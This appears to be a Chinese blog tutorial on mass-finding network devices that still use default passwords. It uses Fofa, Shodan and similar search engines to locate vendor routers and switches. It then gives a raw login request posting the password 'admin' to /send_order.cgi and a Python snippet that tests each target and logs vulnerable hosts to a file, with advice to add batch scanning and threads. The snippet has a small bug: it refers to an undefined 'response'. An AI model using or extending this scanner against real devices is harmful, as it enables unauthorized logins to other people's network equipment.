弱口令通用型证书正确姿势


    为什么说最简单 其实一句话概括就是弱口令yyds 其中最明显的就是网络设备了比如路由器、交换机、等等因为大部人思维就是这东西进来能干嘛

    1.直接找各大厂商的官网，查看其所具有的产品，找个需要挖掘哪款产品哪个型号存在弱口令。

    2.利用搜索引擎发现网络设备、安全设备等存在弱口令的资产：Fofa、ZoomEye、shodan、Google hacking 排名不分先后好坏 ，适合自己就行 以fofa为例 可以先大规模搜 直接厂商名字，进去看看在细分如title参数或body参数进行详细搜索。


    3.各大厂商的网络设备、安全设备都设置了默认账号密码，基本都为弱口令，建议可以先从网络设备的弱口令开始搜索，安全设备基本都会设置首次登陆强制更改密码。

进一步确认错误是如何

得到请求数据条件如图 说明可以简化请求参数 

POST /send_order.cgi?parameter=login HTTP/1.1Host: xxx.xxx.xxx.xxx{"password":"admin"}

返回包如图 （一会写代码要用到） 进一步确认

正确请求 返回如下 HTTP/1.0 200 OKSet-Cookie:hash_key=0927339132620797,session_id=0438241321207495; {"type":0,"msg":"ok"}

    那么接下来我们就开始写python  流程是先单个测试在加批量当然有高手还可以加多线程 

这里定义url变量 （url为访问ip）+地址
数据为burp请求包内数据


    url = target_url + "/send_order.cgi?parameter=login"    data = '{"password":"admin"}'

关键代码如下：

    try:        r = requests.post(url=url, data=data, verify=False, timeout=5)        if "ok" in r.text and response.status_code == 200:            print("登陆地址 {}/home/login.html".format(target_url))             print('\033[36m默认密码为admin \033[0m')            print("\n")            f = open('./poc/vul.txt', 'a')            f.write(url)            f.write('\n')        else:            print('漏洞不存\033[0m')

    post一个请求 

     r = requests.post(url=url, data=data, verify=False, timeout=5) 这里面的参数大家去搜下 比较简单可以不用讲，一看也都知道意思，加入if来判断 r.text 存在ok两个字 且请求为响应状态码200 那么就有漏洞反之则无,接下来把连接保存到一个名为vul.txt的文本 运行测试后得到想要的效果
